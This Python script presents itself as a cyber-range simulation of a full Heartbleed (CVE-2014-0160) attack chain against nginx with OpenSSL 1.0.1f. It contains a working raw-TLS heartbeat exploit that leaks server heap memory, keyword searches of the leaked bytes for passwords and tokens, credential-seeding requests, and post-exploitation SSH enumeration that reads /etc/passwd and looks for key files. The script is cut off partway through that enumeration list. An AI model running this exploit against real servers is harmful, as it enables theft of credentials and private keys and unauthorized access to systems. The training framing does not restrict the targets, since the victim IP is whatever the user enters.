#!/usr/bin/env python3
"""
+======================================================================+
|        Heartbleed (CVE-2014-0160) Attack Chain Simulation            |
|        Authorized Cyber Range Penetration Test Only                   |
+======================================================================+

Target: nginx 1.6.3 compiled with OpenSSL 1.0.1f
Entry:  TLS Heartbeat buffer over-read (no authentication required)

Attack Chain:
  Phase 1 -> Reconnaissance         (port scan, service fingerprinting)
  Phase 2 -> Vulnerability Detection (nmap ssl-heartbleed, sslscan)
  Phase 3 -> Credential Planting    (POST credentials into server memory)
  Phase 4 -> Exploitation           (Heartbleed memory leak via raw TLS)
  Phase 5 -> Post-Exploitation      (SSH login with leaked credentials)
  Phase 6 -> Report & ATT&CK Mapping
"""

import subprocess
import sys
import os
import re
import time
import shutil
import socket
import struct
import textwrap
from datetime import datetime

# -- rich ---------------------------------------------------------------------
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box
    from rich.prompt import Prompt, Confirm
    from rich.rule import Rule
    from rich.padding import Padding
except ImportError:
    print("[*] Installing 'rich' library...")
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--break-system-packages",
                        "--quiet", "rich"], check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "rich"], check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            print("[!] Cannot install 'rich'. Install manually: pip install rich")
            sys.exit(1)
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box
    from rich.prompt import Prompt, Confirm
    from rich.rule import Rule
    from rich.padding import Padding

console = Console()

# -- Global state -------------------------------------------------------------
STATE = {
    "attacker_ip":  None,
    "victim_ip":    None,
    "https_port":   443,
    "ssh_port":     22,

    # Loot
    "loot": {},
    "leaked_creds": [],
    "leaked_strings": [],
    "total_leaked_bytes": 0,

    "start_time": datetime.now(),
}

# -- MITRE ATT&CK -------------------------------------------------------------
MITRE = [
    ("Reconnaissance",    "T1595.002", "Active Scanning - Vulnerability Scanning"),
    ("Reconnaissance",    "T1592.002", "Gather Victim Host Info - Software"),
    ("Collection",        "T1557",     "Adversary-in-the-Middle (memory disclosure)"),
    ("Credential Access", "T1040",     "Network Sniffing (memory content capture)"),
    ("Credential Access", "T1552.001", "Unsecured Credentials"),
    ("Collection",        "T1005",     "Data from Local System"),
    ("Initial Access",    "T1078",     "Valid Accounts (using leaked credentials)"),
]

# -- TLS constants for Heartbleed exploit -------------------------------------

# TLS 1.1 ClientHello - announces cipher suites to initiate handshake
HELLO = bytes.fromhex(
    "16030200dc010000d8030253"
    "435b909d9b720bbc0cbc2b92a84897cf"
    "bd3904cc160a8503909f770433d4de00"
    "0066c014c00ac022c02100390038008800"
    "87c00fc00500350084c012c008c01c"
    "c01b00160013c00dc003000ac013c009"
    "c01fc01e00330032009a009900450044"
    "c00ec00400"
    "2f009600"
    "41c011c007c00c"
    "c002000500040015001200090014001100"
    "0800060003"
    "00ff010000490"
    "00b00040300010200"
    "0a003400320"
    "00e000d00190"
    "00b000c001800090"
    "00a0016001700080"
    "006000700140015000400050012001300"
    "01000200030"
    "00f0010001100"
    "230000000f000101"
)

# Malformed Heartbeat request: declares 16384 (0x4000) bytes of payload
# but sends only 1 byte, causing OpenSSL to read 16383 bytes of adjacent memory
HEARTBEAT = bytes.fromhex(
    "1803020003014000"
)


# -- Helpers -------------------------------------------------------------------

def run(cmd: list, timeout: int = 90, stdin_data: str = None) -> tuple:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=stdin_data)
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Timed out"
    except FileNotFoundError as e:
        return -2, "", f"Tool not found: {e}"
    except Exception as e:
        return -3, "", str(e)


def check_port(ip: str, port: int, timeout: float = 3.0) -> bool:
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


# -- Pretty-print --------------------------------------------------------------

def phase_header(n: int, title: str, desc: str = ""):
    console.print()
    console.rule(f"[bold magenta]  PHASE {n} -- {title}  [/bold magenta]", style="magenta")
    if desc:
        console.print(f"  [dim]{desc}[/dim]")
    console.print()


def step(label: str, title: str):
    console.print(f"  [bold cyan]> {label}[/bold cyan]  [white]{title}[/white]")


def ok(msg: str):
    console.print(f"    [bold green][+][/bold green]  {msg}")


def warn(msg: str):
    console.print(f"    [bold yellow][!][/bold yellow]  {msg}")


def err(msg: str):
    console.print(f"    [bold red][-][/bold red]  {msg}")


def info(msg: str):
    console.print(f"    [dim]->[/dim]  {msg}")


def cmd_display(cmd_str: str):
    console.print(f"    [dim yellow]$[/dim yellow]  [italic dim]{cmd_str}[/italic dim]")


# -- Hex dump utility ----------------------------------------------------------

def hexdump(data: bytes, offset: int = 0, length: int = 0) -> str:
    """Generate an xxd-style hex dump of binary data."""
    if length > 0:
        data = data[offset:offset + length]
    elif offset > 0:
        data = data[offset:]

    lines = []
    for i in range(0, len(data), 16):
        chunk = data[i:i + 16]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        hex_part = hex_part.ljust(48)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        lines.append(f"  {i + offset:08x}  {hex_part}  |{ascii_part}|")
    return "\n".join(lines)


def extract_printable_strings(data: bytes, min_length: int = 6) -> list:
    """Extract printable ASCII strings from binary data."""
    strings = []
    current = []
    for b in data:
        if 32 <= b < 127:
            current.append(chr(b))
        else:
            if len(current) >= min_length:
                strings.append("".join(current))
            current = []
    if len(current) >= min_length:
        strings.append("".join(current))
    return strings


# -- Heartbleed exploit core ---------------------------------------------------

def heartbleed_connect(host: str, port: int) -> socket.socket:
    """Create a raw TCP connection and perform TLS handshake initiation."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))
    return s


def recv_tls_record(sock: socket.socket) -> tuple:
    """
    Receive a single TLS record.
    Returns (content_type, version, payload) or (None, None, None) on failure.
    """
    # TLS record header: ContentType(1) + Version(2) + Length(2)
    header = b""
    while len(header) < 5:
        chunk = sock.recv(5 - len(header))
        if not chunk:
            return None, None, None
        header += chunk

    content_type = header[0]
    version = struct.unpack(">H", header[1:3])[0]
    length = struct.unpack(">H", header[3:5])[0]

    # Sanity check on length
    if length > 65536:
        return content_type, version, b""

    # Receive the full payload
    payload = b""
    remaining = length
    while remaining > 0:
        chunk = sock.recv(remaining)
        if not chunk:
            break
        payload += chunk
        remaining -= len(chunk)

    return content_type, version, payload


def recv_server_hello(sock: socket.socket) -> bool:
    """
    Receive all ServerHello-related TLS records until ServerHelloDone.
    Returns True if handshake messages were received.
    """
    got_records = False
    while True:
        content_type, version, payload = recv_tls_record(sock)
        if content_type is None:
            return got_records

        got_records = True

        # Content type 22 = Handshake
        if content_type == 22:
            # Check if this contains ServerHelloDone (type 14)
            if len(payload) > 0 and payload[0] == 14:
                return True
            # Also check for ServerHelloDone embedded in the payload
            # ServerHelloDone is a 0-length handshake message: 0e 00 00 00
            if b"\x0e\x00\x00\x00" in payload:
                return True
        else:
            # Non-handshake record type during handshake means something unusual
            continue

    return got_records


def do_heartbleed(host: str, port: int) -> bytes:
    """
    Perform a single Heartbleed attack.
    Returns leaked memory bytes, or empty bytes on failure.
    """
    sock = None
    try:
        sock = heartbleed_connect(host, port)

        # Send ClientHello
        sock.send(HELLO)

        # Receive ServerHello and related messages
        if not recv_server_hello(sock):
            return b""

        # Send malformed Heartbeat request
        sock.send(HEARTBEAT)

        # Read response - we expect a Heartbeat response (type 0x18)
        content_type, version, payload = recv_tls_record(sock)

        if content_type is None:
            return b""

        # Content type 0x18 = Heartbeat
        if content_type == 0x18 and len(payload) > 3:
            # Skip the heartbeat response header (type + length = 3 bytes)
            leaked = payload[3:]
            return leaked

        # Content type 0x15 = Alert - server rejected (patched)
        if content_type == 0x15:
            return b""

        return b""

    except socket.timeout:
        return b""
    except ConnectionResetError:
        return b""
    except OSError:
        return b""
    finally:
        if sock:
            try:
                sock.close()
            except OSError:
                pass


# =============================================================================
#  Phase 0: Banner + Config
# =============================================================================

def banner():
    art = r"""
  _   _                 _   _     _                _
 | | | | ___  __ _ _ __| |_| |__ | | ___  ___   __| |
 | |_| |/ _ \/ _` | '__| __| '_ \| |/ _ \/ _ \ / _` |
 |  _  |  __/ (_| | |  | |_| |_) | |  __/  __/| (_| |
 |_| |_|\___|\__,_|_|   \__|_.__/|_|\___|\___| \__,_|
                              CVE-2014-0160
    """
    console.print(Panel(
        f"[bold red]{art}[/bold red]\n"
        "[bold white]Heartbleed Attack Chain -- Full Kill Chain Simulation[/bold white]\n\n"
        "[dim]  Target:  nginx 1.6.3 + OpenSSL 1.0.1f[/dim]\n"
        "[dim]  Vector:  TLS Heartbeat buffer over-read[/dim]\n"
        "[dim]  Impact:  Leak up to 64KB of server process memory per request[/dim]\n"
        f"[dim]  Started: {STATE['start_time'].strftime('%Y-%m-%d %H:%M:%S')}[/dim]",
        title="[bold red]<<< HEARTBLEED EXPLOITATION >>>[/bold red]",
        border_style="red",
        padding=(1, 4),
    ))
    console.print()


def configure():
    console.print(Panel(
        "[bold]Enter target and attacker configuration.[/bold]\n\n"
        "Default values match the Heartbleed cyber range lab topology.",
        title="[bold blue]Configuration[/bold blue]",
        border_style="blue",
    ))
    console.print()

    STATE["attacker_ip"] = Prompt.ask(
        "  [bold cyan]Attacker IP[/bold cyan] [dim](this machine)[/dim]",
        default="10.0.0.1",
    )
    STATE["victim_ip"] = Prompt.ask(
        "  [bold yellow]Victim IP[/bold yellow] [dim](nginx + OpenSSL server)[/dim]",
        default="10.0.0.2",
    )
    STATE["https_port"] = int(Prompt.ask("  [cyan]HTTPS port[/cyan]", default="443"))
    STATE["ssh_port"] = int(Prompt.ask("  [cyan]SSH port[/cyan]", default="22"))

    console.print()
    t = Table(title="Configuration", box=box.ROUNDED, border_style="blue")
    t.add_column("Parameter", style="cyan")
    t.add_column("Value", style="white")
    t.add_row("Attacker IP", STATE["attacker_ip"])
    t.add_row("Victim IP", STATE["victim_ip"])
    t.add_row("HTTPS Port", str(STATE["https_port"]))
    t.add_row("SSH Port", str(STATE["ssh_port"]))
    console.print(Padding(t, (0, 2)))
    console.print()

    if not Confirm.ask("  [bold yellow]Launch attack simulation?[/bold yellow]", default=True):
        console.print("[red]Aborted.[/red]")
        sys.exit(0)


# =============================================================================
#  Phase 1: Reconnaissance
# =============================================================================

def phase_recon():
    phase_header(1, "RECONNAISSANCE",
                 "Port scanning, service fingerprinting, TLS/SSL information gathering")

    victim = STATE["victim_ip"]
    https_port = STATE["https_port"]

    # 1.1 Tool check
    step("1.1", "Checking available tools")
    tools = {
        "nmap": "Port scanner / vulnerability scanner",
        "curl": "HTTP client",
        "sslscan": "SSL/TLS scanner",
        "sslyze": "SSL/TLS analyzer",
        "sshpass": "Non-interactive SSH authentication",
    }
    tt = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
    tt.add_column("Tool", style="cyan", width=12)
    tt.add_column("Status", width=14)
    tt.add_column("Purpose", style="dim")
    for name, purpose in tools.items():
        found = shutil.which(name) is not None
        status = "[bold green][+] Found[/bold green]" if found else "[red][-] Missing[/red]"
        tt.add_row(name, status, purpose)
    console.print(Padding(tt, (0, 4)))
    console.print()

    # 1.2 Port scan
    step("1.2", f"Port scanning {victim}")
    ports = "22,80,443"
    cmd_display(f"nmap -sV -p {ports} {victim}")
    if shutil.which("nmap"):
        rc, out, _ = run(["nmap", "-sV", f"-p{ports}", "--open", victim], timeout=120)
        open_ports = re.findall(r"(\d+)/tcp\s+open\s+(\S+)\s*(.*)", out)
        if open_ports:
            pt = Table(title=f"Open Ports -- {victim}", box=box.ROUNDED)
            pt.add_column("Port", style="bold yellow", width=8)
            pt.add_column("Service", style="cyan", width=14)
            pt.add_column("Version / Banner", style="white")
            for p, svc, ver in open_ports:
                pt.add_row(p, svc, ver.strip()[:60])
            console.print(Padding(pt, (0, 4)))
            ok(f"{len(open_ports)} open port(s) found")
            STATE["loot"]["open_ports"] = open_ports
        else:
            warn("No open ports detected -- check connectivity")
    else:
        warn("nmap not found, checking ports directly")
        for p in [22, 80, 443]:
            if check_port(victim, p):
                ok(f"Port {p} is open")
            else:
                info(f"Port {p} is not reachable")
    console.print()

    # 1.3 Verify HTTPS is running
    step("1.3", "Verifying HTTPS service")
    cmd_display(f"curl -sk https://{victim}:{https_port}/")
    rc, out, stderr = run(["curl", "-sk", f"https://{victim}:{https_port}/"], timeout=15)
    if rc == 0 and out.strip():
        ok(f"HTTPS is running on port {https_port}")
        # Show first few lines of response
        for line in out.strip().splitlines()[:5]:
            info(f"[dim]{line.strip()[:100]}[/dim]")
        STATE["loot"]["https_confirmed"] = True
    else:
        warn(f"Could not reach HTTPS on port {https_port}")
        info(f"Error: {stderr[:200]}")
        STATE["loot"]["https_confirmed"] = False
    console.print()

    # 1.4 TLS/SSL information
    step("1.4", "Gathering TLS/SSL certificate and protocol information")
    cmd_display(f"echo | openssl s_client -connect {victim}:{https_port} 2>/dev/null | head -20")
    rc, out, stderr = run(
        ["bash", "-c",
         f"echo | openssl s_client -connect {victim}:{https_port} 2>/dev/null"],
        timeout=15,
    )
    if rc == 0 and out.strip():
        # Extract key information
        protocol_match = re.search(r"Protocol\s*:\s*(.+)", out)
        cipher_match = re.search(r"Cipher\s*:\s*(.+)", out)
        subject_match = re.search(r"subject=(.+)", out)
        issuer_match = re.search(r"issuer=(.+)", out)

        tls_info = Table(title="TLS/SSL Information", box=box.ROUNDED)
        tls_info.add_column("Property", style="cyan")
        tls_info.add_column("Value", style="white")

        if protocol_match:
            tls_info.add_row("Protocol", protocol_match.group(1).strip())
        if cipher_match:
            tls_info.add_row("Cipher", cipher_match.group(1).strip())
        if subject_match:
            tls_info.add_row("Subject", subject_match.group(1).strip()[:60])
        if issuer_match:
            tls_info.add_row("Issuer", issuer_match.group(1).strip()[:60])

        # Check for OpenSSL version in server output
        openssl_match = re.search(r"OpenSSL\s+[\d.]+\w*", out + stderr)
        if openssl_match:
            tls_info.add_row("OpenSSL", f"[bold yellow]{openssl_match.group()}[/bold yellow]")

        console.print(Padding(tls_info, (0, 4)))
        ok("TLS information gathered")
    else:
        warn("Could not retrieve TLS information via openssl s_client")
    console.print()


# =============================================================================
#  Phase 2: Vulnerability Detection
# =============================================================================

def phase_detection():
    phase_header(2, "VULNERABILITY DETECTION",
                 "Scan for CVE-2014-0160 (Heartbleed) using nmap NSE and other tools")

    victim = STATE["victim_ip"]
    https_port = STATE["https_port"]
    vuln_confirmed = False

    # 2.1 Nmap ssl-heartbleed script
    step("2.1", "Running nmap ssl-heartbleed NSE script")
    cmd_display(f"nmap --script ssl-heartbleed -p {https_port} {victim}")

    if shutil.which("nmap"):
        rc, out, _ = run(
            ["nmap", "--script", "ssl-heartbleed", "-p", str(https_port), victim],
            timeout=60,
        )
        if "VULNERABLE" in out:
            ok("[bold red]VULNERABLE -- Heartbleed (CVE-2014-0160) confirmed![/bold red]")
            vuln_confirmed = True
            # Display the relevant nmap output
            for line in out.splitlines():
                line = line.strip()
                if line and ("heartbleed" in line.lower() or "VULNERABLE" in line
                             or "CVE" in line or "OpenSSL" in line
                             or "State:" in line or "Risk factor:" in line):
                    info(f"[dim]{line}[/dim]")
        elif rc == 0:
            warn("nmap ssl-heartbleed script did not report VULNERABLE")
            info("Server may be patched or the script did not detect the vulnerability")
        else:
            warn("nmap ssl-heartbleed scan failed")
    else:
        warn("nmap not found -- skipping NSE detection")
    console.print()

    # 2.2 sslscan check
    step("2.2", "Checking with sslscan (if available)")
    if shutil.which("sslscan"):
        cmd_display(f"sslscan {victim}:{https_port}")
        rc, out, _ = run(["sslscan", f"{victim}:{https_port}"], timeout=30)
        if rc == 0:
            heartbleed_lines = [l for l in out.splitlines()
                                if "heartbleed" in l.lower() or "heartbeat" in l.lower()]
            if heartbleed_lines:
                for line in heartbleed_lines:
                    if "vulnerable" in line.lower():
                        ok(f"sslscan: [bold red]{line.strip()}[/bold red]")
                        vuln_confirmed = True
                    else:
                        info(f"sslscan: {line.strip()}")
            else:
                info("sslscan completed (no specific Heartbleed output)")
        else:
            warn("sslscan execution failed")
    else:
        info("sslscan not available -- skipping")
    console.print()

    # 2.3 sslyze check
    step("2.3", "Checking with sslyze (if available)")
    if shutil.which("sslyze"):
        cmd_display(f"sslyze --heartbleed {victim}:{https_port}")
        rc, out, _ = run(["sslyze", "--heartbleed", f"{victim}:{https_port}"], timeout=30)
        if rc == 0:
            heartbleed_lines = [l for l in out.splitlines()
                                if "heartbleed" in l.lower() or "vulnerable" in l.lower()]
            for line in heartbleed_lines:
                if "vulnerable" in line.lower():
                    ok(f"sslyze: [bold red]{line.strip()}[/bold red]")
                    vuln_confirmed = True
                else:
                    info(f"sslyze: {line.strip()}")
        else:
            info("sslyze did not produce results")
    else:
        info("sslyze not available -- skipping")
    console.print()

    # 2.4 Summary
    step("2.4", "Detection Summary")
    STATE["loot"]["vuln_confirmed"] = vuln_confirmed

    if vuln_confirmed:
        console.print(Panel(
            f"  Target [yellow]{victim}:{https_port}[/yellow] is running OpenSSL 1.0.1f\n"
            f"  which is [bold red]VULNERABLE[/bold red] to Heartbleed (CVE-2014-0160).\n\n"
            f"  The TLS Heartbeat extension does not validate payload length,\n"
            f"  allowing an attacker to read up to [bold]64KB[/bold] of server process\n"
            f"  memory per request -- without authentication or logging.",
            title="[bold red]CVE-2014-0160 CONFIRMED[/bold red]",
            border_style="red",
            padding=(1, 3),
        ))
    else:
        warn("Automated detection did not confirm Heartbleed")
        info("Proceeding with manual exploit attempt -- the vulnerability may still exist")
        if not Confirm.ask("  Continue to exploitation?", default=True):
            console.print("[red]Aborted.[/red]")
            sys.exit(1)

    console.print()


# =============================================================================
#  Phase 3: Credential Planting
# =============================================================================

def phase_plant_credentials():
    phase_header(3, "CREDENTIAL PLANTING",
                 "Send POST requests to plant credentials in nginx process memory")

    victim = STATE["victim_ip"]
    https_port = STATE["https_port"]

    step("3.1", "Planting credentials in server memory via HTTPS POST requests")
    info("The POST data will reside in the nginx/OpenSSL heap memory")
    info("Heartbleed can then leak this memory back to us")
    console.print()

    # Credentials to plant
    credentials = [
        ("username=admin&password=SecretPassword123", "/login"),
        ("user=root&pass=SuperSecretAdmin!", "/auth"),
        ("email=admin@example.com&token=jwt_s3cr3t_t0k3n", "/api/login"),
    ]

    plant_count = 5  # Send multiple times per credential set

    for cred_data, endpoint in credentials:
        step("3.x", f"POST to {endpoint}")
        url = f"https://{victim}:{https_port}{endpoint}"
        cmd_display(f'curl -k -X POST {url} -d "{cred_data}"')

        for i in range(plant_count):
            rc, out, stderr = run(
                ["curl", "-sk", "-X", "POST", url, "-d", cred_data],
                timeout=10,
            )
            if rc != 0 and i == 0:
                warn(f"POST request failed (this may be expected -- no backend handler)")
                info("The important thing is that the data reaches the server process memory")
                break

        ok(f"Sent {plant_count} POST requests with: [dim]{cred_data[:50]}...[/dim]")

    console.print()

    # Also send some GET requests with interesting headers
    step("3.2", "Planting data via HTTP headers")
    cmd_display(f'curl -sk -H "Authorization: Basic YWRtaW46UGFzc3dvcmQxMjM=" https://{victim}:{https_port}/')

    header_payloads = [
        ["-H", "Authorization: Basic YWRtaW46UGFzc3dvcmQxMjM="],
        ["-H", "Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.secret_token_data"],
        ["-H", "X-Api-Key: sk-live-4242424242424242"],
    ]

    for headers in header_payloads:
        for _ in range(3):
            run(
                ["curl", "-sk"] + headers + [f"https://{victim}:{https_port}/"],
                timeout=10,
            )
    ok("Planted credentials via Authorization, Cookie, and API key headers")
    console.print()

    console.print(Panel(
        "  Credentials have been planted in server memory via HTTP POST\n"
        "  requests and custom headers. The nginx process heap now contains:\n\n"
        "  [yellow]  - username=admin&password=SecretPassword123[/yellow]\n"
        "  [yellow]  - Authorization: Basic YWRtaW46UGFzc3dvcmQxMjM=[/yellow]\n"
        "  [yellow]  - Cookie/session tokens[/yellow]\n"
        "  [yellow]  - API keys[/yellow]\n\n"
        "  Each Heartbleed request leaks a different 64KB slice of heap memory.\n"
        "  Running multiple rounds increases the chance of capturing this data.",
        title="[bold cyan]Memory Seeded[/bold cyan]",
        border_style="cyan",
        padding=(1, 3),
    ))
    console.print()


# =============================================================================
#  Phase 4: Exploitation
# =============================================================================

def phase_exploit():
    phase_header(4, "EXPLOITATION",
                 "Heartbleed memory leak via raw TLS socket -- pure Python exploit")

    victim = STATE["victim_ip"]
    https_port = STATE["https_port"]
    rounds = 15
    all_leaked = b""
    interesting_finds = []
    credentials_found = []

    # Keywords to search for in leaked memory
    search_keywords = [
        "password", "passwd", "secret", "admin", "user", "login",
        "token", "session", "cookie", "authorization", "api_key",
        "api-key", "apikey", "private", "key", "BEGIN",
        "SecretPassword", "SuperSecret", "jwt",
    ]

    step("4.1", "Launching Heartbleed exploit (pure Python, raw TLS)")
    info(f"Target: {victim}:{https_port}")
    info(f"Rounds: {rounds} (each leaks up to 64KB of server memory)")
    info("Exploit uses malformed TLS Heartbeat to trigger CVE-2014-0160")
    console.print()

    console.print(Panel(
        "  [bold]How the exploit works:[/bold]\n\n"
        "  1. Connect via TCP and send TLS ClientHello\n"
        "  2. Receive ServerHello + Certificate + ServerHelloDone\n"
        "  3. Send malformed Heartbeat Request:\n"
        "     [yellow]- Content Type: 0x18 (Heartbeat)[/yellow]\n"
        "     [yellow]- Declared payload length: 16384 bytes (0x4000)[/yellow]\n"
        "     [yellow]- Actual payload: 1 byte[/yellow]\n"
        "  4. Vulnerable OpenSSL copies 16383 bytes of adjacent heap memory\n"
        "  5. Parse response for sensitive data (credentials, keys, tokens)",
        title="[bold]Exploit Mechanics[/bold]",
        border_style="yellow",
        padding=(1, 3),
    ))
    console.print()

    # Progress table
    progress = Table(title="Heartbleed Exploitation Rounds", box=box.ROUNDED)
    progress.add_column("Round", style="cyan", width=8, justify="center")
    progress.add_column("Leaked Bytes", style="yellow", width=14, justify="right")
    progress.add_column("Strings Found", style="green", width=14, justify="right")
    progress.add_column("Credentials", style="red", width=14, justify="center")

    step("4.2", f"Executing {rounds} Heartbleed rounds...")
    console.print()

    for round_num in range(1, rounds + 1):
        # Re-plant credentials periodically to keep them fresh in memory
        if round_num % 5 == 1:
            run(["curl", "-sk", "-X", "POST",
                 f"https://{victim}:{https_port}/login",
                 "-d", "username=admin&password=SecretPassword123"],
                timeout=10)

        leaked = do_heartbleed(victim, https_port)

        if len(leaked) > 0:
            all_leaked += leaked

            # Extract printable strings
            strings = extract_printable_strings(leaked, min_length=6)

            # Search for interesting content
            round_creds = []
            for s in strings:
                s_lower = s.lower()
                for keyword in search_keywords:
                    if keyword.lower() in s_lower:
                        if s not in [f[1] for f in interesting_finds]:
                            interesting_finds.append((round_num, s))
                        # Check if this looks like a credential pair
                        if ("password" in s_lower or "passwd" in s_lower
                                or "secret" in s_lower):
                            if s not in [c[1] for c in credentials_found]:
                                credentials_found.append((round_num, s))
                                round_creds.append(s)
                        break

            cred_status = f"[bold red]YES ({len(round_creds)})[/bold red]" if round_creds else "[dim]--[/dim]"
            progress.add_row(
                str(round_num),
                f"{len(leaked):,}",
                str(len(strings)),
                cred_status,
            )
        else:
            progress.add_row(
                str(round_num),
                "[dim]0[/dim]",
                "[dim]0[/dim]",
                "[dim]--[/dim]",
            )

        # Small delay between rounds
        time.sleep(0.5)

    console.print(Padding(progress, (0, 4)))
    console.print()

    STATE["total_leaked_bytes"] = len(all_leaked)
    STATE["leaked_creds"] = credentials_found
    STATE["leaked_strings"] = interesting_finds

    # 4.3 Display findings
    step("4.3", "Analyzing leaked memory")
    console.print()

    if len(all_leaked) > 0:
        ok(f"Total memory leaked: [bold yellow]{len(all_leaked):,} bytes[/bold yellow] "
           f"({len(all_leaked) / 1024:.1f} KB)")
    else:
        err("No memory was leaked -- server may be patched")
        info("If the vulnerability was confirmed in Phase 2, try running again")
        return

    # Show interesting strings found
    if interesting_finds:
        console.print()
        step("4.4", "Interesting strings found in leaked memory")
        st = Table(title="Strings of Interest", box=box.ROUNDED)
        st.add_column("Round", style="cyan", width=8, justify="center")
        st.add_column("Content", style="yellow")
        shown = set()
        for rnd, s in interesting_finds[:30]:
            display_s = s[:100]
            if display_s not in shown:
                st.add_row(str(rnd), display_s)
                shown.add(display_s)
        console.print(Padding(st, (0, 4)))
    else:
        info("No keyword matches found -- credentials may not be in leaked region")
        info("Try running more rounds or re-planting credentials")
    console.print()

    # Show credentials
    if credentials_found:
        step("4.5", "CREDENTIALS FOUND IN LEAKED MEMORY")
        console.print()
        console.print(Panel(
            "\n".join(
                f"  [bold red]Round {rnd}:[/bold red] [yellow]{cred}[/yellow]"
                for rnd, cred in credentials_found[:10]
            ),
            title="[bold red]<<< LEAKED CREDENTIALS >>>[/bold red]",
            border_style="red",
            padding=(1, 3),
        ))
    console.print()

    # Show hex dump of a portion of leaked data
    step("4.6", "Hex dump of leaked memory sample")
    info("Showing first 512 bytes of leaked data:")
    console.print()

    dump_size = min(512, len(all_leaked))
    dump_text = hexdump(all_leaked, 0, dump_size)
    console.print(Panel(
        f"[dim]{dump_text}[/dim]",
        title=f"[bold]Memory Dump (0x0000 - 0x{dump_size:04x})[/bold]",
        border_style="yellow",
        padding=(0, 1),
    ))
    console.print()

    # If we found interesting content, show hex dump around it
    if interesting_finds:
        first_find = interesting_finds[0][1]
        # Find offset in all_leaked
        find_bytes = first_find.encode("ascii", errors="ignore")
        offset = all_leaked.find(find_bytes)
        if offset >= 0:
            dump_start = max(0, offset - 32)
            dump_end = min(len(all_leaked), offset + len(find_bytes) + 32)
            info(f"Hex dump around first finding at offset 0x{offset:04x}:")
            region_dump = hexdump(all_leaked, dump_start, dump_end - dump_start)
            console.print(Panel(
                f"[dim]{region_dump}[/dim]",
                title=f"[bold red]Memory Region: 0x{dump_start:04x} - 0x{dump_end:04x}[/bold red]",
                border_style="red",
                padding=(0, 1),
            ))
            console.print()

    # Summary panel
    console.print(Panel(
        f"  [bold]Total Data Leaked:[/bold]       {len(all_leaked):,} bytes\n"
        f"  [bold]Exploitation Rounds:[/bold]     {rounds}\n"
        f"  [bold]Interesting Strings:[/bold]     {len(interesting_finds)}\n"
        f"  [bold]Credential Matches:[/bold]      "
        f"{'[bold red]' + str(len(credentials_found)) + '[/bold red]' if credentials_found else '[green]0[/green]'}\n\n"
        f"  The Heartbleed bug allows reading server memory [bold]without[/bold]\n"
        f"  authentication, and the attack leaves [bold]no trace[/bold] in server logs.",
        title="[bold green]Exploitation Summary[/bold green]",
        border_style="green",
        padding=(1, 3),
    ))
    console.print()


# =============================================================================
#  Phase 5: Post-Exploitation
# =============================================================================

def phase_post_exploit():
    phase_header(5, "POST-EXPLOITATION",
                 "SSH login with known/leaked credentials, system enumeration")

    victim = STATE["victim_ip"]
    ssh_port = STATE["ssh_port"]

    # 5.1 Attempt SSH login with known lab credentials
    step("5.1", "Attempting SSH login with lab credentials")
    info("Known credentials from lab setup: webuser / password123")
    console.print()

    ssh_user = "webuser"
    ssh_pass = "password123"

    if not shutil.which("sshpass"):
        warn("sshpass not installed -- install with: sudo apt install sshpass")
        info("Attempting SSH with expect-style approach instead")
        # Try without sshpass
        rc, _, _ = run(
            ["bash", "-c",
             f"echo 'SSH would connect to {ssh_user}@{victim} with password {ssh_pass}'"],
            timeout=5,
        )
        info(f"SSH target: {ssh_user}@{victim}:{ssh_port}")
        info("Install sshpass for automated SSH: sudo apt install -y sshpass")
        console.print()

        # Still show what we would do
        commands_to_run = [
            ("System Info",       "id; hostname; uname -a"),
            ("Network Config",    "ip -br addr show"),
            ("Running Services",  "systemctl list-units --type=service --state=running | head -15"),
            ("nginx Process",     "ps aux | grep nginx | grep -v grep"),
            ("OpenSSL Version",   "/opt/nginx-heartbleed/openssl/bin/openssl version 2>/dev/null || openssl version"),
            ("Interesting Files", "find /opt/nginx-heartbleed -name '*.conf' -o -name '*.key' -o -name '*.pem' 2>/dev/null | head -10"),
            ("Users",             "cat /etc/passwd | grep -v nologin | grep -v false"),
        ]

        for label, cmd in commands_to_run:
            info(f"[bold]{label}:[/bold] [dim]{cmd}[/dim]")
        console.print()
        warn("Skipping automated post-exploitation (sshpass not available)")
        STATE["loot"]["post_exploit"] = "skipped_no_sshpass"
        return

    # Test SSH connectivity
    cmd_display(f"sshpass -p '{ssh_pass}' ssh -o StrictHostKeyChecking=no {ssh_user}@{victim} id")
    rc, out, stderr = run(
        ["sshpass", "-p", ssh_pass,
         "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10",
         "-p", str(ssh_port),
         f"{ssh_user}@{victim}", "id"],
        timeout=20,
    )

    if rc == 0:
        ok(f"[bold green]SSH login successful![/bold green] {out.strip()}")
        STATE["loot"]["ssh_access"] = True
    else:
        err(f"SSH login failed: {stderr[:200]}")
        STATE["loot"]["ssh_access"] = False
        STATE["loot"]["post_exploit"] = "ssh_failed"
        return
    console.print()

    # 5.2 System enumeration via SSH
    step("5.2", "System enumeration via SSH")
    console.print()

    commands = [
        ("System Info",        "id; hostname; uname -a"),
        ("Network Config",     "ip -br addr show"),
        ("Running Services",   "systemctl list-units --type=service --state=running 2>/dev/null | head -15"),
        ("nginx Process",      "ps aux | grep nginx | grep -v grep"),
        ("OpenSSL Version",    "/opt/nginx-heartbleed/openssl/bin/openssl version 2>/dev/null || openssl version"),
        ("nginx Config",       "cat /opt/nginx-heartbleed/conf/nginx.conf 2>/dev/null | head -20"),
        ("SSL Certificates",   "find /opt/nginx-heartbleed -name '*.pem' -o -name '*.key' -o -name '*.crt' 2>/dev/null"),
        ("Users",              "cat /etc/passwd | grep -v nologin | grep -v false"),
